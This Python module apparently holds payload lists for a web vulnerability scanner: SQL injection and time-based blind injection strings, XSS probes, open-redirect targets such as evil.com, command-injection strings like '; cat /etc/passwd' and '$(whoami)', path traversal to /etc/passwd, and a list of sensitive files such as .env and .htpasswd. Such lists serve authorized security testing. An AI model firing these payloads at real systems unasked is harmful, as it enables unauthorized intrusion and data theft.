import requests
def sqli_payloads():
    """Return a list of SQL Injection payloads."""
    return [
        "'",
        '"',
        "' OR '1'='1",
        '" OR "1"="1',
        "' OR 1=1--",
        '" OR 1=1--'
    ]

def xss_payloads():
    """Return a list of XSS payloads."""
    return [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "'\"><script>alert('XSS')</script>",
        "<svg/onload=alert('XSS')>"
    ]

def open_redirect_payloads():
    return [
        "http://example.com",     # Common test redirection
        "//example.com",          # Scheme-relative (can bypass filters)
        "/\\example.com",         # Path-trick
        "///example.com",         # Often misparsed
        "http:example.com",       # Missing slashes
        "https://evil.com",       # Generic attack domain
        "https://google.com"      # Safe/known domain for whitelisting logic
    ]

def redirect_param_names():
    return [
        "next", "url", "redirect", "redirect_uri", "continue"
    ]

def command_injection_basic_payloads():
    return [
        "test; ping -c 1 127.0.0.1",
        "test && ping -c 1 127.0.0.1",
        "test | ping -c 1 127.0.0.1",
        "`ping -c 1 127.0.0.1`",
        "$(ping -c 1 127.0.0.1)",
        "|| ping -c 1 127.0.0.1"
    ]

def command_injection_advanced_payloads():
    return [
        "| nslookup example.com",
        "& whoami",
        "; cat /etc/passwd",
        "`id`",
        "$(whoami)",
        "& sleep 5"
    ]


def is_command_injection_successful(response_text):
    indicators = [
        "PING", "TTL=", "bytes from", "icmp_seq=", "time="
    ]
    return any(indicator.lower() in response_text.lower() for indicator in indicators)

def misconfiguration_paths():
    return [
        # Sensitive files
        ".env", ".git/config", ".svn/entries", "web.config", "config.php",
        ".htaccess", ".htpasswd", ".bash_history", ".DS_Store", "docker-compose.yml",

        # Diagnostic / Info tools
        "phpinfo.php", "server-status", "server-info", "adminer.php", "phpmyadmin/",

        # Backup/leftover files
        "backup/", "db.sql", "dump.sql", "site.bak", "config.old", "index~.php", "wp-config.php.bak",

        # Dev/testing environments
        "dev/", "debug/", "test/", "staging/", "beta/", "old/", "v1/", "v2/",

        # Admin interfaces
        "admin/", "monitor/", "dashboard/", ".well-known/security.txt"
    ]

def csrf_token_names():
    return [
        "csrf", "csrf_token", "_csrf", "authenticity_token",
        "__RequestVerificationToken", "token", "_token"
    ]

import random

def blind_sqli_payloads():
    all_payloads = [
        "' OR SLEEP(5)--",
        "\" OR SLEEP(5)--",
        "' AND IF(1=1, SLEEP(5), 0)--",
        "\" AND IF(1=1, SLEEP(5), 0)--",
        "'; SELECT pg_sleep(5);--",
        "'; WAITFOR DELAY '0:0:5'--"
    ]
    return random.sample(all_payloads, 4)  # Pick 4 each run

def dom_xss_payloads():
    return [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "\"><svg/onload=alert('XSS')>",
    ]

directory_traversal_payloads = [
    "../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..%5c..%5c..%5cwindows%5cwin.ini",
]


